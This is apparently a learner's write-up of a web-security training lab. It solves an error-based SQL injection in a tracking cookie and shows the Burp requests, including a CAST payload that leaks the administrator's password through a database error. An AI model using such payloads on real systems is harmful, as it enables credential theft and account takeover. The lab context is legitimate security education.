*This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.*

Accessed the *My account* page and checked Burp HTTP History to check the request : 
```Burp 
GET /login HTTP/2
Host: 0aaa00f8034111d381c3437f004e0071.web-security-academy.net
Cookie: TrackingId=IO2vznEfZ4GGAstg; 
...
```
The response was the login page. 

I tested the application for SQLi by inserting a `'` in the cookie, as such: 
```Burp 
GET /login HTTP/2
Host: 0aaa00f8034111d381c3437f004e0071.web-security-academy.net
Cookie: TrackingId=IO2vznEfZ4GGAstg';
...
```
I received the following response: 
```Burp 
<h4>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'IO2vznEfZ4GGAstg''. Expected  char</h4>
```
I then tried to see if i can obtain a visible error. Using `CAST()` i modified the query to the following : 
```Burp 
GET /login HTTP/2
Host: 0aaa00f8034111d381c3437f004e0071.web-security-academy.net
Cookie: TrackingId='||CAST((SELECT password FROM users LIMIT 1)AS int)--;
```
I removed the value of the cookie and used `limit 1` to bypass the character limit on the query, which will throw unexpected errors.

I received the following response: 
```Burp 
<p class=is-warning>ERROR: invalid input syntax for type integer: "tirdib4p6fzefsyevp93"</p>
```
I then logged in using the credentials : 
![[Screenshot 2024-05-02 at 5.33.43 PM.png]]

